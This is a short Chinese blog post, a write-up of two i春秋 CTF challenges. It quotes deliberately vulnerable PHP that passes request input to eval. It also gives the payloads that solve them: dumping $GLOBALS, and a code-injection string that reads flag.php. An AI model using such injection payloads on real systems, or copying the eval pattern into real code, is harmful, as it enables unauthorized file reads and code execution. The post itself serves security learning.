---
title: i春秋-CTF-Write-Up
date: 2018-03-23 20:53:29
categories: Write Up
tags:
 - ctf
 - wp
description:
---
记录在i春秋中的艰辛历史...
[i春秋CTF大本营](https://www.ichunqiu.com/battalion)
<!-- more -->
### 爆破-1
```php
include "flag.php";
$a = @$_REQUEST['hello'];
if(!preg_match('/^\w*$/',$a )){
  die('ERROR');
}
eval("var_dump($$a);");
show_source(__FILE__);
```
进入页面看见代码，正则过滤死了，只能输入英文字母和下划线。所以不能拼接字符串失败进行代码注入。
就可以尝试猜测变量，来获取想要看的内容。
直接传递`hello=flag`试试，发现提示`flag在一个长度为6的变量里面`。这样的话除非是纯数字，不然很不好爆破。
然后想到`$GLOBALS`，可以打印出所有全局变量。
尝试`hello=GLOBALS`。得到flag

<br>
### 爆破-2
```php
include "flag.php";
$a = @$_REQUEST['hello'];
eval( "var_dump($a);");
show_source(__FILE__);
```
没有正则过滤，直接拼接字符串就可以实现代码注入。
`hello=);print_r(file('flag.php')`，最后凭借的结果就是`eval( "var_dump(hello=);print_r(file('flag.php'));");`
直接打印`flag.php`的内容。

<br>

### 爆破-3


<br>

### 爆破-3


<br>
